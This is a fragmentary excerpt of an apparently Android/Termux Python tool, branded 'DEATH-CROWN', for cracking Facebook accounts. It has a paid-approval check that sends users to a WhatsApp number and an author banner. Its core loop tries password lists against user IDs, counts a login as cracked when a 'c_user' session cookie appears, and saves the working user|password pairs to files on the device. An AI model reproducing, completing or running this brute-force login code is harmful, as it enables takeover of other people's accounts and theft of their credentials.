...
def main_apv():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801581721171?text=' + tks)

        

    r1=requests.get("https://github.com/READ-BULL/Zihan/tree/main/approval.txt").text
    ...
    if key1 in r1:
        ...
        print ("         ༄•───────────────────────────────────────•༄")
        print ("             \033[1;94mGIVE ME 100TAKA FOR APROVAL 𝘿𝙀𝘼𝙏𝙃")     
        ...
        os.system('am start https://wa.me/+8801581721171t?text=' + tks)
...
\033[0;95m    ██████╔╝███████╗██║  ██║   ██║   ██║  ██║
 \033[0;96m   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝
\t   \033[31;42m𝘿𝙀𝘼𝙏𝙃\33[0;m\__😘😈

    
  [\x1b[1;95m+\x1b[1;97m] AUTHOR : Rifat ❾❾❾
  [\x1b[1;95m+\x1b[1;97m] GITHUB : DEATH-420        
  [\x1b[1;95m+\x1b[1;97m] FACEBOOK : 𝚁𝚟 𝚁𝚒𝚏𝚊𝚝 
  [\x1b[1;95m+\x1b[1;97m] YOU TUBE : ❝𝘿𝙀𝘼𝙏𝙃 ✰ 𝘾𝙍𝙊𝙒𝙉❞ ❾❾                       
  [\x1b[1;95m+\x1b[1;97m] VERSION : 6.9"""
...
def R():
			...
			if key in [""]:
				...
				os.system("xdg-open https://www.facebook.com/rv.𝘿𝙀𝘼𝙏𝙃.008")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[𝘿𝙀𝘼𝙏𝙃-𝘾𝙍𝙊𝙒𝙉]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [𝘿𝙀𝘼𝙏𝙃-OK 💥] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/𝘿𝙀𝘼𝙏𝙃_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/𝘿𝙀𝘼𝙏𝙃_CP.txt' , 'a').write('%s\n' % wrt)
